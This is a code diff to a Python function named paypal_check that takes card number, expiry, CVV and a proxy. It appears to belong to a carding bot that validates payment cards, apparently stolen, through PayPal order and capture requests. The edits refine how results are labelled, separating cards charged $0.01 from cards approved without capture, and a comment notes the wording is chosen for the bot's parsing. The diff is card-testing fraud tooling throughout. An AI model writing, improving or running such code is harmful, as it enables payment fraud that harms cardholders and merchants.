@@ -337,11 +337,11 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
                 f"&disable-card=&token={order_id}"
             )
 
-            # The card went with the order, so the answer is already
-            # in it.  The capture takes the money, but the token from
-            # the buttons page may not have that right, so the order
-            # is what is read.
+            # The card went with the order, so paypal has already said
+            # what it thinks of the card.  The capture is the step that
+            # takes the money, and it is the only one that proves it.
             result_text = r2.text
+            captured = False
             if r2.status_code in (200, 201):
                 try:
                     r3 = await client.post(
@@ -355,12 +355,14 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
                         },
                         timeout=20,
                     )
-                    # the capture is the better answer when it works
                     if r3.status_code in (200, 201):
                         result_text = r3.text
+                        captured = True
                     else:
-                        logger.info("The capture was refused (%s), the order is read instead",
-                                    r3.status_code)
+                        # The money did not move.  The order still says
+                        # the card is good, but that is not a charge.
+                        logger.info("The capture was refused (%s): %s",
+                                    r3.status_code, r3.text[:160])
                 except Exception as e:
                     logger.info("The capture failed: %s", e)
 
@@ -380,11 +382,17 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
             if not result_json:
                 txt = result_text.lower()
 
-            # the order that was taken
-            if '"status":"completed"' in txt:
-                return f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]"
+            # the money only moved when the capture worked
+            if captured:
+                if '"status":"completed"' in txt or '"status":"approved"' in txt:
+                    return f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]"
+
+            # the order was approved, so the card is good, but the
+            # capture was refused and no money moved.  The word charged
+            # is left out on purpose, the bot looks for it.
             if '"status":"approved"' in txt:
-                # paypal took the card, so it is a good one
+                return f"Approved - Card Valid, No Money Taken | {cc[:6]} [{elapsed}s]"
+            if '"status":"completed"' in txt:
                 return f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]"
             if '"status":"payer_action_required"' in txt:
                 return f"Approved - 3DS Required | {cc[:6]} [{elapsed}s]"
